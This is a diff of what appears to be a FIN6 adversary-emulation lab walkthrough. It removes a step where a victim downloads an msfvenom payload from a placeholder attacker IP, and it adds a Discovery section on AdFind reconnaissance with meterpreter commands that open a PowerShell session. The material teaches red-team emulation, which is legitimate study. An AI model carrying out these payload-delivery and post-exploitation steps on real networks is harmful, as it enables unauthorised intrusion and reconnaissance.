@@ -119,10 +119,7 @@ sudo python3 -m http.server 80
 
 ### 1.5 - Download Payload to Start the Communication on Exploit Handler
 
-Switch to the victim's Server. Open a browser and navigate to to the following address to download the payload to the Desktop. Make sure to replace
-the IP address placeholder with the IP address of the attackerVM:
-
-- http://[Attacker IP]/tmp/my_payload.exe
+Switch to the victim's Server. Open a browser and navigate to to the attackerVM IP address to download the payload to the Desktop.
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Download_MsfVenom_Payload.png){:width="100%"}
 
@@ -136,7 +133,22 @@ FIN6
 
 ## Step 2 - Discovery
 
-FIN6
+After gaining access to the target network, FIN6 enumerates the network and Active Directory (AD) environment. The second objective is to conduct internal reconnaissance. The intent of Discovery is to identify opportunities for escalation, lateral movement, systems for staging, and systems of interest for the effects phase of the emulation. 
+
+### 2.1 - Software: AdFind [**S0552**](https://attack.mitre.org/software/S0552/)
+
+FIN6 is believed to have used ADFind for this purpose on at least one occasion. 
+
+[**AdFind**](https://www.joeware.net/freetools/tools/adfind/) is a command line Active Directory query tool. Mixture of ldapsearch, search.vbs, ldp, dsquery, and dsget tools with a ton of other cool features thrown in for good measure. This tool proceeded dsquery/dsget/etc by years though I did adopt some of the useful stuff from those tools.
+
+On the `meterpreter` terminal, we will use PowerShell session instead to download AdFind on Windows directory. To enable PowerShell session, run the following commands:
+
+```bash
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > 
+```
 
 ## Step 3 - Privilege Escalation
 
